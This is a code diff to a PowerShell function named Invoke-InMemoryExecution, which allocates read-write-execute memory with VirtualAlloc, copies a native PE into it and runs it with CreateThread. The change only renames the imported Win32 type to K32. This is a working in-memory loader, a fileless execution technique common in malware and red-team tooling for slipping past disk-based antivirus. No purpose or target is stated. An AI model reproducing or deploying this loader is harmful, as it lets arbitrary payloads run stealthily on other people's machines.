@@ -589,25 +589,23 @@ function Invoke-InMemoryExecution {
             Write-Log "  Detected native PE -- using VirtualAlloc + CreateThread" "INFO"
 
             # Add Win32 API types if not already loaded
-            if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
+            if (-not ([System.Management.Automation.PSTypeName]'K32').Type) {
                 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32 {
-    public class Kernel32 {
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+public class K32 {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-        [DllImport("kernel32.dll")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    [DllImport("kernel32.dll")]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
-    }
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
 }
 "@
             }
@@ -615,7 +613,7 @@ public class Win32 {
             try {
                 # Allocate RWX memory
                 $allocSize = [uint32]$bytes.Length
-                $mem = [Win32.Kernel32]::VirtualAlloc(
+                $mem = [K32]::VirtualAlloc(
                     [IntPtr]::Zero,
                     $allocSize,
                     0x3000,   # MEM_COMMIT | MEM_RESERVE
@@ -634,20 +632,20 @@ public class Win32 {
                 Write-Log "  PE bytes copied to memory" "INFO"
 
                 # Create thread at the allocated memory
-                $thread = [Win32.Kernel32]::CreateThread(
+                $thread = [K32]::CreateThread(
                     [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero
                 )
 
                 if ($thread -eq [IntPtr]::Zero) {
                     Write-Log "  CreateThread failed" "FAIL"
-                    [Win32.Kernel32]::VirtualFree($mem, 0, 0x8000) | Out-Null
+                    [K32]::VirtualFree($mem, 0, 0x8000) | Out-Null
                     return
                 }
 
                 Write-Log "  Thread created -- PE executing in memory" "OK"
 
                 # Wait briefly then check
-                [Win32.Kernel32]::WaitForSingleObject($thread, 5000) | Out-Null
+                [K32]::WaitForSingleObject($thread, 5000) | Out-Null
                 Write-Log "  In-memory execution completed" "OK"
             }
             catch {
